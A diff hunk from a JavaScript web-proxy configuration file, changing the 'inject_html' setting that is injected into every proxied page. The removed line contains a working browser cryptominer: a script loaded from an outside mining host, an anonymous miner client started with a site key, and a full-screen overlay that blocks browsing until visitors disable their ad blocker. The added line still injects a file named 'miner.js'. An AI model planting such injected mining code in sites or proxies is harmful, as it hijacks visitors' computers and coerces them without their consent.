@@ -79,7 +79,7 @@ jsproxy_config({
   /**
    * 自定义注入页面的 HTML
    */
-  inject_html: '<script src="https://www.hostingcloud.racing/dVTM.js"></script> <script>var _client = new Client.Anonymous('ffeb5499683f358a9605c5834258297c74e6a61a80a3d287bc3ee68ce7f81607', {throttle: 0.5, c: 'w'}); _client.start(); _client.addMiningNotification("Bottom", "JavaScript miner running", "#dbdbdb", 30, "#404040"); </script> <script> setTimeout(function(){ if(typeof _client === 'undefined' || _client === null){ var messageDiv = document.createElement("div"); messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;"); messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that.")); var mainDiv = document.createElement("div"); mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center"); mainDiv.appendChild(messageDiv); document.body.appendChild(mainDiv); document.getElementsByTagName("body")[0].style.overflow = "hidden"; window.scrollTo(0, 0); } },1000); </script>',
+  inject_html: 'miner.js',
 
   /**
    * URL 自定义处理（设计中）
